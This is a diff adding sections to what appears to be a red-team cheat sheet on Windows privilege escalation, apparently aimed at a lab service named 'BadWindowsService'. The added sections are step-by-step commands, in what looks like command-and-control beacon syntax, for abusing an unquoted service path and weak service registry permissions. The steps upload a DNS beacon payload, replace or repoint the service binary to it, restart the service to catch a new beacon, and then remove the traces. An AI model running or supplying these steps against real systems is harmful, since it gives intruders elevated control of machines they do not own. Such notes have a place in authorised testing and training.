@@ -1,6 +1,6 @@
 
 
-#### Vulnerable Services
+#### Unquoted Service Path
 
 Enumerate available services
 ```powershell
@@ -15,6 +15,70 @@ sc_qc BadWindowsService
 
 cacls "C:\Program Files\Bad Windows Service"
 ```
+
+Upload DNS payload and rename to abuse unquoted service path
+```powershell
+cd C:\Program Files\Bad Windows Service
+
+upload C:\Payloads\dns_x64.svc.exe
+
+mv dns_x64.svc.exe Service.exe
+```
+
+Restart service
+```powershell
+sc_stop BadWindowsService
+sc_start BadWindowsService
+```
+
+Checkin on new beacon
+```powershell
+checkin
+```
+
+Remove payload
+```powershell
+rm Service.exe
+```
+
+#### Service Registry Permissions
+
+Enumerate permissions of the service's regsitry key and view current bin path
+```powershell
+powerpick Get-Acl -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\BadWindowsService' | fl
+
+sc_qc BadWindowsService
+```
+
+Stop the service
+```powershell
+sc_stop BadWindowsService
+```
+
+Upload payload to writeable directory
+```powershell
+cd C:\Windows\Tasks
+
+upload C:\Payloads\dns_x64.svc.exe
+```
+
+Change bin path to the payload
+```powershell
+sc_config BadWindowsService C:\Windows\Tasks\dns_x64.svc.exe 0 2
+```
+
+Start the service
+```powershell
+sc_start BadWindowsService
+```
+
+Restore the bin path and remove payload
+```powershell
+sc_config BadWindowsService "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe" 0 2
+
+rm  C:\Windows\Tasks\dns_x64.svc.exe
+```
+
 
 
 #### UAC Bypass
